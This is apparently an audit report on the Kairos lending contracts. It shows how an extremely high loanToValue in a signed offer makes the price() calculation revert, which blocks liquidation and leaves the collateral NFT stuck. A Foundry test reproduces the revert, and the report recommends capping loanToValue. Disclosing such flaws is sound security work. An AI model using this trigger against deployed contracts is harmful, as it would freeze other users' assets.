# Denial-of-Service in the liquidation flow results in the collateral NTF will be stuck in the contract.


## Summary
If the `loanTovalue` value of the offer is extremely high, the liquidation flow will be reverted, causing the collateral NTF to persist in the contract forever.


## Vulnerability Detail
The platform allows users to sign offers and provide funds to those who need to borrow assets.

In the first scenario, the lender provided an offer that the `loanTovalue` as high as the result of the `shareMatched` is `0`. For example, if the borrowed amount was `1e40` and the offer had a `loanTovalue` equal to `1e68`, the share would be `0`.

As a result, an arithmetic error (`Division or modulo by 0`) will occur in the `price()` function at line 50 during the liquidation process.

In the second scenario, if the lender's share exceeds `0`, but the offer's `loanToValue` is extremely high, the `price()` function at line 54 may encounter an arithmetic error(`Arithmetic over/underflow`) during the `estimatedValue` calculation.

## Poof of Concept
**kairos-contracts/test/BorrowBorrow.t.sol**
```solidity
function testBorrowOverflow() public {
    uint256 borrowAmount = 1e40;
    BorrowArg[] memory borrowArgs = new BorrowArg[](1);
    (, ,uint256 loanId , ) = kairos.getParameters();
    loanId += 1;

    Offer memory offer = Offer({
            assetToLend: money,
            loanToValue: 1e61,
            duration: 1,
            expirationDate: block.timestamp + 2 hours,
            tranche: 0,
            collateral: getNft()
        });
    uint256 currentTokenId;

    getFlooz(signer, money, getOfferArg(offer).amount);

    {
        OfferArg[] memory offerArgs = new OfferArg[](1);
        currentTokenId = getJpeg(BORROWER, nft);
        offer.collateral.id = currentTokenId;
        offerArgs[0] = OfferArg({
            signature: getSignature(offer),
            amount: borrowAmount,
            offer: offer
        });
        borrowArgs[0] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});
    }

    vm.prank(BORROWER);
    kairos.borrow(borrowArgs);

    assertEq(nft.balanceOf(BORROWER), 0);
    assertEq(money.balanceOf(BORROWER), borrowAmount);
    assertEq(nft.balanceOf(address(kairos)), 1);

    vm.warp(block.timestamp + 1);
    Loan memory loan = kairos.getLoan(loanId);
    console.log("price of loanId", kairos.price(loanId));
}
```



## Impact
The loan position will not be liquidated, which will result in the collateral NTF being permanently frozen in the contract.

## Tool used

Manual Review

## Recommendation
We recommend adding the mechanism during the borrowing process to restrict the maximum `loanToValue` limit and ensure that the lender's share is always greater than zero. This will prevent arithmetic errors.
